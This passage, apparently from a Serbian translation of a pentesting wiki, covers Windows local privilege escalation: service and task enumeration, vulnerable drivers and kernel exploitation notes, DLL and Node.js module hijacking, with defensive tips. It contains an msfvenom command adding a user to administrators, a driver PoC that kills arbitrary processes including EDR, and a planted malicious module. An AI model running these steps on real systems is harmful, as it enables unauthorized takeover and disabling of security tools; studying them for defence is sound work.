C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Izlistajte sve necitirane putanje servisa, osim onih koje pripadaju ugrađenim Windows servisima:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Ovu ranjivost možete otkriti i eksploatisati** pomoću metasploit-a: `exploit/windows/local/trusted\_service\_path` Binarni fajl servisa možete ručno kreirati pomoću metasploit-a:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Akcije oporavka

Windows omogućava korisnicima da navedu radnje koje će se izvršiti ako dođe do otkaza usluge. Ova funkcija može da se podesi tako da pokazuje na binarnu datoteku. Ako je tu binarnu datoteku moguće zameniti, možda je moguća eskalacija privilegija. Više detalja možete pronaći u [zvaničnoj dokumentaciji](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Ciljevi skripti zakazanih zadataka

Za omogućeni zadatak koji pokreće `cmd.exe /c` sa `.bat` ili `.cmd` datotekom, proverite skriptu navedenu u **argumentima akcije**, kao i `cmd.exe`. Isto važi i za eksplicitni argument datoteke interpretera, kao što je PowerShell `-File`. Ako zakazana batch datoteka sadrži doslovni PowerShell poziv `-File`, proverite i ACL te referencirane skripte; promenljive, uslovne naredbe i ulančavanje komandi zahtevaju ručno praćenje. Skripta ili nadređeni direktorijum u koji pozivalac može da upisuje predstavljaju mogućnost za izvršavanje između naloga samo ako se konfigurisani principal zadatka razlikuje od pozivaoca i ako zadatak zaista stigne do te akcije. ACL koji dozvoljava samo dodavanje može biti značajan za skripte, ali raniji `exit` ili drugi tok izvršavanja može učiniti dodate linije nedostižnim. Pre nego što utvrdite da je moguća eskalacija, potvrdite efektivne ACL-ove, [kontekst izvršavanja zadatka](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), radni direktorijum, okidač i smernice za kontrolu aplikacija. Inventarisanje ne bi smelo da menja skriptu niti da pokreće zadatak.

## Imenovani tokovi u dostupnim datotekama

U NTFS-u, čitljiva datoteka može da ima imenovani tok `:$DATA` čiji sadržaj nije prikazan u uobičajenom listingu direktorijuma. Za mali, relevantan skup dostupnih rezervnih kopija ili konfiguracionih datoteka, pregledajte **nazive i veličine** tokova pre nego što otvorite njihov sadržaj; Windows im omogućava pristup putem [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams), a PowerShell putem [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Naziv toka koji ukazuje na tajnu samo je trag. Proverite efektivni pristup čitanja datoteci, podršku sistema datoteka za tokove, da li tok sadrži upotrebljive akreditive i na koji se nalog oni zaista odnose. Izbegavajte rekurzivno skeniranje tokova i ispisivanje njihovog sadržaja tokom rutinskog popisivanja.

## Ulazi pomoćnog programa Windows Driver Kit koji se koristi u zakazanim zadacima

Opcioni Windows Driver Kit sadrži `StandaloneRunner.exe`, koji iz svog direktorijuma za pokretanje može da koristi datoteke `command.txt`, `reboot.rsf` i projektnu datoteku `working\rsf.rsf`. Zakazani zadatak ili usluga koji pokreću ovaj pomoćni program pod privilegovanim nalogom mogu omogućiti izvršavanje komandi u kontekstu tog naloga ako korisnik sa niskim privilegijama može da upisuje u te ulazne datoteke, čak i kada je sama izvršna datoteka zaštićena. Potvrdite da postoji privilegovani potrošač i da je moguće kreirati ili menjati **obe** pomoćne datoteke; samo pronalaženje pomoćnog programa nije dovoljno.

Kod zakazanog zadatka, proverite [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) njegove akcije i ACL-ove dve putanje pomoćnih datoteka. Ako zadatak ne navodi radni direktorijum, direktorijum izvršne datoteke samo je trag koji treba proveriti, a ne dokaz lokacije sa koje zadatak čita ulazne datoteke. Takođe mora biti ispunjen preduslov u vezi sa projektnom radnom datotekom. Proverite stvarni principal zadatka umesto da pretpostavite da se izvršava kao SYSTEM.

## Aplikacije

### Instalirane aplikacije

Proverite **dozvole nad binarnim datotekama** (možda možete da zamenite neku i eskalirate privilegije) i nad **direktorijumima** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Putanja za popravku Windows agenta Checkmk

[CVE-2024-0670](https://checkmk.com/werk/16361) utiče na starije Windows agente Checkmk koji su upisivali komandne datoteke u `C:\Windows\Temp`, a zatim izvršavali postojeću datoteku zaštićenu od upisivanja kada zamena ne bi uspela. Dobavljač je otklonio problem u verzijama 2.1.0p40, 2.2.0p23, 2.3.0b1 i 2.4.0b1. Proverite kompletnu instaliranu verziju zakrpe i da li može da se pokrene operacija agenta na koju problem utiče; oznaka samo grane, poput `2.1`, ne može da utvrdi izloženost. Enumeracija može da proveri verziju, stanje servisa i dozvole za Temp bez kreiranja datoteka ili pokretanja komandi agenta.

#### Provera SAML servisa ADSelfService Plus

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) uticao je na ADSelfService Plus verzije 6210 i starije; dobavljač je otklonio problem u verziji 6211. Relevantan je samo ako je SAML SSO **omogućen sada ili je ranije bio omogućen**. Stavka o instaliranom proizvodu ili putanja servisa zato predstavljaju samo indiciju, a ne potvrdu ranjivosti: proverite tačnu verziju, istoriju SAML konfiguracije, mrežnu dostupnost servisa i nalog pod kojim se izvršava. Izvršavanje koda kroz servis nasleđuje privilegije tog naloga; izvršavanje kao SYSTEM zahteva instancu pokrenutu kao SYSTEM. Čitljiva datoteka `OfflineBackup_*.ezip` u direktorijumu Backup proizvoda predstavlja zasebnu indiciju o šifrovanoj rezervnoj kopiji, a ne dokaz da su akreditivi upotrebljivi ili da postoji ova SAML ranjivost. Tokom rutinske enumeracije zabeležite njenu putanju i prava pristupa, ali je nemojte raspakivati.

#### Granice između Jenkins kontrolera i domenskog naloga

Na Windows Jenkins kontroleru razlikujte dozvolu za kreiranje ili konfigurisanje posla od dozvole za njegovo pokretanje: [Jenkins ih dokumentuje kao zasebna prava `Job/Create`, `Job/Configure` i `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Konfigurisani raspored ili udaljeni okidač mogu da pruže drugi način pokretanja izgradnje, ali proverite da li je omogućen i da li se izgradnja zaista izvršava. Izvršavanje koristi identitet kontrolera ili izabranog agenta, a sačuvani akreditiv može da se koristi samo ako posao ima pristup njegovom opsegu. Zasebno proverite pristup metapodacima `JENKINS_HOME`: Jenkins čuva materijal akreditiva i ključeve za šifrovanje u datotekama `credentials.xml`, `secrets/hudson.util.Secret` i `secrets/master.key` ([Jenkins čuvanje tajni](https://www.jenkins.io/doc/developer/security/secrets/)). Njihovo prisustvo samo po sebi ne otkriva lozinku; proverite **pristup za čitanje potrebnih datoteka** i zasebnu putanju za ponovnu upotrebu naloga, bez ispisivanja tajni u deljenom izlazu. Ako taj nalog ima pravo upisivanja u AD korisnički objekat `scriptPath`, proverite da li je putanja skripte upisiva i da li postoji stvarna prijava ili zakazani potrošač koji radi kao ciljni korisnik, pre nego što to smatrate izvršavanjem između korisnika. Za dodatnu kontrolu grupa potrebno je zasebno proveriti efektivna AD prava.

#### Identitet samostalno hostovanog agenta Azure Pipelines

Za projekat Azure DevOps Server ili Azure Pipelines razdvojite dozvolu za **kreiranje ili uređivanje** pipeline-a od dozvole za njegovo **stavljanje u red čekanja** i korišćenje izabranog skupa agenata; [Microsoft zasebno dokumentuje dozvole za pipeline](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) i [autorizaciju skupa agenata](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops). Ako nalog sa nižim privilegijama može da pošalje korak skripte i pokrene taj pipeline na samostalno hostovanom Windows agentu, korak se izvršava kao [konfigurisani nalog operativnog sistema agenta](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Pre tvrdnje o prelasku između korisnika ili na SYSTEM proverite konkretan pipeline, ograničenja grana/resursa, autorizovani skup agenata, posao koji može da se pokrene i identitet servisa agenta. Instalirani agent, uloga u projektu ili pravo upisivanja u repozitorijum sami po sebi predstavljaju samo indicije; tokom pasivne enumeracije pregledajte dozvole i lokalne metapodatke servisa bez pokretanja izgradnje.

#### Akreditivi za Microsoft Entra Connect Sync

[Microsoft pravi razliku](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) između **ADSync service account**, koji pokreće servis za sinhronizaciju i pristupa njegovoj SQL bazi podataka, i **AD DS connector account**, čije dozvole u direktorijumu zavise od konfigurisanih funkcija sinhronizacije. Akreditivi konektora čuvaju se šifrovani u toj bazi podataka, a ključni materijal je [zaštićen pomoću DPAPI-ja pod ADSync service account](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Instalirani servis za sinhronizaciju, lokalna grupa čije ime sugeriše administratorske privilegije ili sam pristup bazi podataka ne dokazuju da je akreditiv moguće dešifrovati niti da je moguća eskalacija u domenu. Zasebno proverite stvarna prava za čitanje baze podataka, pristup naloga servisa i ključevima, raspored instalacije i SQL-a, konfigurisani identitet konektora i efektivne AD privilegije tog identiteta. Rutinska enumeracija treba da prikazuje samo metapodatke servisa i pristupa, a ne da upituje ili ispisuje sačuvane tajne.

#### Dozvole za DLL-ove podrške upravljačkog programa štampača

Instalirani upravljački program štampača može da čuva DLL-ove podrške u `C:\ProgramData` i da ih učitava u privilegovanijem procesu štampanja. Proverite tačan direktorijum upravljačkog programa i ACL-ove DLL-ova, uključujući nadređene direktorijume i tačke ponovne analize, čak i ako je WMI enumeracija štampača zabranjena. Za [problem u upravljačkom programu штampača Ricoh CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1), prijavljena putanja bila je `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [originalno obaveštenje](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) opisuje učitavanje DLL-ova pomoću `PrintIsolationHost.exe`. ACL koji dozvoljava upisivanje predstavlja samo indiciju: proverite efektivna prava upisivanja nakon primene ACE unosa za zabranu, da li je odgovarajući upravljački program instaliran i učitava li datoteku pod privilegovanim identitetom, kao i da li je dobavljač ažuriranim upravljačkim programom ili bezbednosnim programom otklonio problem u instalaciji. Nemojte zaključivati da postoji ranjivost samo na osnovu imena direktorijuma ili verzije upravljačkog programa.

### Dozvole za upisivanje

Proverite da li možete da izmenite neku konfiguracionu datoteku kako biste pročitali neku posebnu datoteku ili da li možete da izmenite binarnu datoteku koju će izvršavati Administrator nalog (schedtasks).

Slabе dozvole za direktorijume/datoteke на систему можете пронаћи помоћу:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++ додатак за трајност/извршавање при аутоматском учитавању

Notepad++ аутоматски учитава све DLL датотеке додатака у својим поддиректоријумима `plugins`. Ако постоји преносива инсталација или копија у коју може да се уписује, постављање злонамерног додатка омогућава аутоматско извршавање кода у оквиру процеса `notepad++.exe` при сваком покретању (укључујући извршавање из `DllMain` и повратних позива додатка).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Покретање при стартовању

**Проверите да ли можете да замените неки кључ регистра или бинарну датотеку коју ће покренути други корисник.**\
**Прочитајте** **следећу страницу** да бисте сазнали више о занимљивим **локацијама за аутоматско покретање ради ескалације привилегија**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Драјвери

Потражите могуће **сумњиве/рањиве драјвере трећих страна**

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Ako driver izlaže proizvoljnu primitivu za čitanje/upis u kernel (što je često kod loše dizajniranih IOCTL handlera), možete eskalirati privilegije tako što ćete direktno ukrasti SYSTEM token iz kernel memorije.<sup>[[13]](#references)</sup> Pogledajte tehniku korak po korak ovde:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

Kod bugova sa race condition-om, gde ranjivi poziv otvara putanju Object Manager-a koju kontroliše napadač, namerno usporavanje pretrage (korišćenjem komponenti maksimalne dužine ili dubokih lanaca direktorijuma) može produžiti vremenski prozor sa mikrosekundi na desetine mikrosekundi:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### UAF u cancel-safe redovima, otkrivanje podataka iz paged pool-a i I/O ring pivoti

Neki Windows kernel LPE lanci mogu se napraviti kombinovanjem dve pojedinačno slabe ranjivosti: **race condition-a u životnom veku cancel-safe reda** koji oslobađa zahtev/CBD dok je zaključavanje reda i dalje aktivno i otkrivanja podataka usled **otpuštanja zaključavanja pre kopiranja**, koje preko `RtlCopyToUser` otkriva oslobođenu alokaciju iz paged pool-a.<sup>[[29]](#references)</sup>

Napomene za proveru koda i eksploataciju:

- **Oslobađanje pod zaključavanjem + naknadni cancel**: potražite putanju uspeha koja radi **Acquire -> CompleteRequest/free -> Release**, dok putanja za cancel radi **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Ako putanja uspeha stigne do `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` pre otpuštanja CBDQ/CSQ zaključavanja, nit blokirana u `NtCancelIoFileEx -> IopCsqCancelRoutine` može se kasnije nastaviti i proslediti oslobođeni `PFLT_CALLBACK_DATA` callback-u za uklanjanje u driveru.
- **Ponovo iskoristite oslobođeni objekat reda** pomoću paged-pool alokacije iste veličine koju kontroliše napadač. `NPFS` Data Queue Entries su korisni jer se mogu kontrolisati sadržaj i veličina, a kasnije ih možete proveriti operacijama čitanja/peek nad pipe-om. Ako oslobođeni objekat sadrži list links, prepišite ih **cikličnom listom lažnih request node-ova u korisničkoj memoriji**, tako da driver više puta obrađuje strukture zahteva koje definiše napadač umesto da završi na početku originalne liste.
- **Unapredite predvidljiv upis**: ako lažni zahtev preusmeri ugnježdeni context pointer koji se koristi pri upisima za vođenje evidencije (timestamps / QPC / polja uz refcount), možda ćete dobiti kernel upis čiju **adresu možete kontrolisati, ali ne i vrednost**. U tom slučaju ciljajte polje **length/size** objekta iz pool-a koji ste zasuli umesto konačnog code/data pointer-a, a zatim pregledajte zasute alokacije dok korumpirani objekat ne omogući **čitanje izvan granica paged pool-a**.
- **Obrazac otkrivanja podataka podložan race condition-u**: svaki syscall koji radi `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` dobar je kandidat. Pouzdanost se povećava ako napadač može da uveća bafer koji se kopira (na primer, dodavanjem mnogo stavki liste/resursa koje povećavaju konačnu veličinu alokacije serializer-a), jer duže kopiranje proširuje prozor za zamenu, a da pritom ne mora nužno da sruši mašinu.
- **Ciljevi za dopunu bogati pointer-ima**: nizovi registrovanih bafera u Windows **I/O ring-u** odlični su ciljevi za otkrivanje podataka jer se njihova veličina u paged pool-u može kontrolisati (`8 * regBufferCnt`), a svaki element je kernel pointer ka `_IOP_MC_BUFFER_ENTRY`. Otkrijte jedan od ovih nizova, pronađite okolni `IORING_OBJECT`, a zatim korumpirajte **`RegBuffers`** i **`RegBuffersCount`** kako bi naredne I/O ring operacije koristile lažne stavke koje je pripremio napadač i omogućile proizvoljno čitanje/upis u kernel. Ako je jedini dostupan upis stabilan bajt (na primer, iz `KUSER_SHARED_DATA+0x14`), koristite **preklapajuće neporavnate upise** da biste napravili ponovljeni bajtni user pointer kao što je `0x0101010101010101`, mapirajte ga pomoću `VirtualAlloc` i smestite lažni niz registrovanih bafera na tu adresu.<sup>[[30]](#references)</sup>

Korisni pokazatelji za debugging:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Kada iz oštećenog I/O ring-a dobijete proizvoljan kernel read/write, ukradite SYSTEM token koristeći standardni post-primitive workflow:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitivi za korupciju memorije košnice registra

Savremene ranjivosti košnica omogućavaju pripremu determinističkih rasporeda, zloupotrebu upisivih potomaka HKLM/HKU i pretvaranje korupcije metapodataka u kernel paged-pool overflow-e bez prilagođenog drajvera. Ceo lanac možete naučiti ovde:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### `RtlQueryRegistryValues` type confusion u direct režimu putem putanja pod kontrolom napadača

Neki drajveri prihvataju putanju registra iz userland-a, proveravaju samo da li je ispravan UTF-16 string, a zatim pozivaju `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` sa `RTL_QUERY_REGISTRY_DIRECT` i upisuju rezultat u skalarni tip na steku, kao što je `int readValue`. Ako nedostaje `RTL_QUERY_REGISTRY_TYPECHECK`, `EntryContext` se tumači prema **stvarnom** tipu registra, a ne prema tipu koji je programer očekivao.

Ovo omogućava dva korisna primitiva:<sup>[[24]](#references)[[25]](#references)</sup>

- **Zloupotreba posrednika / oracle**: apsolutna putanja `\Registry\...` pod kontrolom korisnika omogućava drajveru da upituje ključeve koje je izabrao napadač, otkriva da li postoje putem povratnih kodova/zapisa, a ponekad i čita vrednosti kojima pozivalac ne bi mogao direktno da pristupi.
- **Korupcija kernel memorije**: odredište skalarnog tipa, kao što je `&readValue`, podleže type confusion-u kao `REG_QWORD`, `UNICODE_STRING` ili bafer binarnih podataka zadate veličine, u zavisnosti od tipa vrednosti registra.

Praktične napomene za eksploataciju:

- **Ublažavanje u Windows 8+**: ako upit dosegne **nepouzdanu košnicu** sa `RTL_QUERY_REGISTRY_DIRECT`, ali bez `RTL_QUERY_REGISTRY_TYPECHECK`, kernel pozivaoci se ruše uz `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Da bi ranjivost ostala iskoristiva, potražite **ključeve u pouzdanim sistemskim košnicama u koje napadač može da upisuje**, umesto da pripremate vrednosti u okviru `HKCU`.
- **Priprema u pouzdanoj košnici**: koristite NtObjectManager da biste pronašli upisive potomke putanje `\Registry\Machine`, a zatim ponovite skeniranje pomoću dupliranog tokena **low-integrity** da biste pronašli ključeve dostupne iz sandbox-ovanih konteksta:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: direktan upis od 8 bajtova u 4-bajtni `int` oštećuje susedne podatke na steku i može delimično da prepiše obližnji callback/function pointer.
- **`REG_SZ` / `REG_EXPAND_SZ`**: direktni režim očekuje da `EntryContext` pokazuje na `UNICODE_STRING`. Ako kod prvo učita `REG_DWORD` pod kontrolom napadača u skalarni podatak na steku, a zatim ponovo upotrebi isti bafer za čitanje stringa, napadač kontroliše `Length`/`MaximumLength` i delimično utiče na pokazivač `Buffer`, što omogućava delimično kontrolisan upis u kernel.
- **`REG_BINARY`**: za velike binarne podatke, direktni režim tretira prvi `LONG` na adresi `EntryContext` kao veličinu bafera sa predznakom. Ako prethodno čitanje `REG_DWORD` ostavi negativnu vrednost pod kontrolom napadača u ponovo upotrebljenoj skalarnoj promenljivoj, sledeći upit `REG_BINARY` kopira bajtove napadača direktno preko susednih slotova na steku, što je često najjednostavniji način da se u potpunosti prepiše callback pointer.

Obrazac za lov na ranjivosti: **heterogena čitanja iz registra u istu promenljivu na steku bez njene ponovne inicijalizacije**. Pretražite `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, ponovo upotrebljene pokazivače `EntryContext` i putanje koda u kojima prvo čitanje iz registra određuje da li će doći do drugog čitanja.

#### Zloupotreba nedostajućeg FILE_DEVICE_SECURE_OPEN na objektima uređaja (LPE + EDR kill)

Neki potpisani drajveri trećih strana kreiraju objekat uređaja sa strogim SDDL-om pomoću funkcije IoCreateDeviceSecure, ali zaborave da postave FILE_DEVICE_SECURE_OPEN u DeviceCharacteristics. Bez ove zastavice, bezbedni DACL se ne sprovodi pri otvaranju uređaja preko putanje koja sadrži dodatnu komponentu, pa svaki neprivilegovani korisnik može da dobije handle koristeći putanju imenskog prostora kao što je:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (iz slučaja iz stvarnog sveta)

Kada korisnik može da otvori uređaj, zloupotrebom privilegovanih IOCTL-ova koje drajver izlaže moguće je postići LPE i menjati podatke. Primeri mogućnosti zabeleženi u praksi:
- Vraćanje handle-ova sa punim pristupom proizvoljnim procesima (krađa tokena / SYSTEM shell putem DuplicateTokenEx/CreateProcessAsUser).
- Neograničeno čitanje/pisanje sirovog diska (izmene van mreže, trikovi za postojanost pri pokretanju sistema).
- Prekidanje proizvoljnih procesa, uključujući Protected Process/Light (PP/PPL), što omogućava AV/EDR kill iz user land-a putem kernela.

Minimalni obrazac PoC-a (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Mere ublažavanja za developere
- Uvek postavite FILE_DEVICE_SECURE_OPEN prilikom kreiranja objekata uređaja koji treba da budu ograničeni pomoću DACL-a.
- Proverite kontekst pozivaoca za privilegovane operacije. Dodajte PP/PPL provere pre nego što dozvolite prekidanje procesa ili vraćanje handle-ova.
- Ograničite IOCTL-ove (maske pristupa, METHOD_*, validacija ulaza) i razmotrite posredničke modele umesto direktnih privilegija kernela.

Ideje za detekciju za odbranu
- Pratite otvaranja sumnjivih imena uređaja iz user-mode-a (npr. \\ .\\amsdk*) i specifične sekvence IOCTL-ova koje ukazuju na zloupotrebu.
- Sprovodite Microsoft-ovu listu blokiranih ranjivih drajvera (HVCI/WDAC/Smart App Control) i održavajte sopstvene liste dozvoljenih/zabranjenih.


## PATH DLL Hijacking

Ako imate **dozvole za pisanje u fascikli koja se nalazi na PATH-u**, možda ćete moći da otmete DLL koji učitava proces i **eskalirate privilegije**.<sup>[[2]](#references)</sup>

Proverite dozvole za sve fascikle unutar PATH-a:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Za više informacija o tome kako da zloupotrebite ovu proveru:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Otmica razrešavanja Node.js / Electron modula preko `C:\node_modules`

Ovo je varijanta **nekontrolisane putanje pretrage u Windowsu** koja utiče na aplikacije **Node.js** i **Electron** kada obave golu import naredbu, kao što je `require("foo")`, a očekivani modul **nedostaje**.<sup>[[20]](#references)</sup>

Node razrešava pakete tako što se kreće uz stablo direktorijuma i proverava fascikle `node_modules` u svakom roditeljskom direktorijumu. U Windowsu to kretanje može da stigne do korena diska, pa aplikacija pokrenuta iz `C:\Users\Administrator\project\app.js` može da proverava sledeće putanje:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Ako **korisnik sa niskim privilegijama** može da kreira `C:\node_modules`, može da postavi zlonamerni `foo.js` (ili fasciklu paketa) i sačeka da **Node/Electron proces sa višim privilegijama** razreši nedostajuću zavisnost. Payload se izvršava u bezbednosnom kontekstu procesa žrtve, pa ovo postaje **LPE** kad god se cilj pokreće kao administrator, iz omotača zakazanog zadatka/usluge sa povišenim privilegijama ili iz privilegovane desktop aplikacije koja se automatski pokreće.

Ovo je naročito često kada:

- je zavisnost navedena u `optionalDependencies`<sup>[[22]](#references)</sup>
- biblioteka treće strane obavija `require("foo")` u `try/catch` i nastavlja rad u slučaju greške
- je paket uklonjen iz produkcionih buildova, izostavljen prilikom pakovanja ili njegova instalacija nije uspela
- se ranjivi `require()` nalazi duboko u stablu zavisnosti, umesto u kodu glavne aplikacije

### Pronalaženje ranjivih ciljeva

Koristite **Procmon** da biste potvrdili putanju razrešavanja:<sup>[[23]](#references)</sup>

- Filtrirajte po `Process Name` = izvršna datoteka cilja (`node.exe`, EXE Electron aplikacije ili proces omotača)
- Filtrirajte po `Path` koji `contains` `node_modules`
- Obratite pažnju na `NAME NOT FOUND` i poslednje uspešno otvaranje pod `C:\node_modules`

Korisni obrasci za pregled koda u raspakovanim `.asar` datotekama ili izvornom kodu aplikacije:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Eksploatacija

1. Identifikujte **ime nedostajućeg paketa** pomoću Procmon-a ili pregleda izvornog koda.
2. Kreirajte root direktorijum za pretragu ako već ne postoji:

```powershell
mkdir C:\node_modules
```

3. Postavite modul sa tačno očekivanim imenom:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Pokrenite aplikaciju žrtve. Ako aplikacija pokuša `require("foo")`, a legitimni modul ne postoji, Node može da učita `C:\node_modules\foo.js`.

Primeri nedostajućih opcionih modula iz stvarnog sveta koji odgovaraju ovom obrascu uključuju `bluebird` i `utf-8-validate`, ali **tehnika** je ono što se može ponovo primeniti: pronađite bilo koji **nedostajući goli import** koji će privilegovani Windows Node/Electron proces razrešiti.

### Ideje za detekciju i ojačavanje bezbednosti

- Upozorite kada korisnik kreira `C:\node_modules` ili tamo upisuje nove `.js` datoteke/pakete.
- Potražite procese visokog integriteta koji čitaju iz `C:\node_modules\*`.
- U produkciji upakujte sve runtime zavisnosti i proverite upotrebu `optionalDependencies`.
- Pregledajte kod trećih strana zbog obrazaca kao što je `try { require("...") } catch {}` koji tiho ignorišu greške.
- Onemogućite opcione probe ako ih biblioteka podržava (na primer, neke `ws` implementacije mogu da izbegnu zastarelu probu `utf-8-validate` pomoću `WS_NO_UTF_8_VALIDATE=1`).

## Mreža

### Deljeni resursi

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts datoteka

Proverite da li su u hosts datoteci hardkodirani drugi poznati računari.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Mrežni interfejsi i DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Otvoreni portovi

Proverite da li su **ograničene usluge dostupne spolja**

```bash
netstat -ano #Opened ports?
```

